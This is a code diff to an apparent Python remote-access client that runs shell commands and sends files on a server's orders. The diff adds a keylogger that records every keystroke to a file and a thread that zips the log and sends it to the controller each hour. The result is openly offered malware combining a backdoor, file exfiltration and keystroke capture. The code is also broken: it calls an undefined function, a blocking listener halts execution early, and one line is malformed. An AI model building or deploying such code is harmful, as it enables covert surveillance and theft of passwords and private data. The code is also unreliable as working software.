@@ -3,11 +3,72 @@ import socket
 import subprocess
 import os
 import zipfile
+from pynput import keyboard
+import threading
+import time
+
 HOST = "127.0.0.1"
 PORT = 12345
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((HOST, PORT))
+
+file_path = "key_logger.txt"
+
+def on_press(key):
+    try:
+        with open(file_path, "a") as f:
+            f.write(key.char)  
+    except AttributeError:
+        with open(file_path, "a") as f:
+            f.write(f"[{key}]")  
+    
+
+with keyboard.Listener(on_press=on_press) as listener:
+    print("Logging started... Press Ctrl+C to stop.")
+    listener.join()
+
+
+def send_hourly_report():
+
+    while True:
+
+        if os.path.exists(file_path):
+
+            zip_name = file_path + ".zip"
+
+      
+            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(file_path)
+
+          
+            header = f"REPORT|{zip_name}"
+            client.sendall(header.encode())
+
+            time.sleep(0.5)
+
+        
+            with open(zip_name, "rb") as f:
+                while True:
+                    chunk = f.read(1024)
+                    if not chunk:
+                        break
+                    client.sendall(chunk)
+
+            client.sendall(b"EOF")
+
+            os.remove(zip_name)
+
+    
+        time.sleep(3600)
+
+
+
+threading.Thread(target=write_report, daemon=True).start()
+threading.Thread(target=send_hourly_report, daemon=True).start()
+
+
+
 
 while True:
     data = client.recv(1024).decode()
@@ -15,18 +76,18 @@ while True:
     if data == "EXIT":
         break
 
-    # تقسيم البروتوكول
+
     try:
         TYPE, CONTENT = data.split("|", 1)
     except:
         continue
 
-    # تنفيذ أوامر
+
     if TYPE == "CMD":
         result = subprocess.getoutput(CONTENT)
         client.sendall(result.encode())
 
-    # إرسال ملف
+
     elif TYPE == "GET":
         if os.path.exists(CONTENT):
             z_name = CONTENT + ".zip"
@@ -40,10 +101,12 @@ while True:
                     client.sendall(chunk)
 
         client.sendall(b"EOF")
-        os.remove(zip_name)        else:
+        os.remove(z_name)        else:
             client.sendall(b"FILE_NOT_FOUND")
-    # استقبال رسالة
+
     elif TYPE == "MSG":
         print(f"[Server Message]: {CONTENT}")
 
 client.close()
+
+
